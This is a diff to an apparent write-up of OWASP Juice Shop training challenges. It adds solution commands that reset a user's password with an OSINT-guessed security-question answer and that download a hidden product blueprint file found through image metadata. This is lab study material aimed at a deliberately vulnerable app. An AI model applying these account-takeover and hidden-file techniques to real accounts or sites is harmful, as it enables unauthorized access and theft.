@@ -260,7 +260,16 @@ TODO missing
 Reset Uvogin's password via the Forgot Password mechanism
 
 ```bash
-TODO
+https://villains.fandom.com/wiki/Uvogin
+# first
+https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin
+# last
+https://web.archive.org/web/20230430084022/https://twitter.com/uv0gin
+
+# security question: Your favorite movie?
+curl -sS http://juiceshop:3000/rest/user/reset-password \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"email":"uvogin@juice-sh.op","answer":"Silence of the Lambs","new":"12345","repeat":"12345"}'
 ```
 
 ## Retrieve Blueprint
@@ -268,7 +277,14 @@ TODO
 Deprive the shop of earnings by downloading the blueprint for one of its products
 
 ```bash
-TODO
+curl -O http://juiceshop:3000/assets/public/images/products/3d_keychain.jpg
+
+# manufacturer=OpenSCAD
+# model=https://imgur.com/a/GeHQP
+exiftool 3d_keychain.jpg
+
+# https://en.wikibooks.org/wiki/OpenSCAD_User_Manual/STL_Import_and_Export
+curl -O http://juiceshop:3000/assets/public/images/products/JuiceShop.stl
 ```
 
 ## Visual Geo Stalking
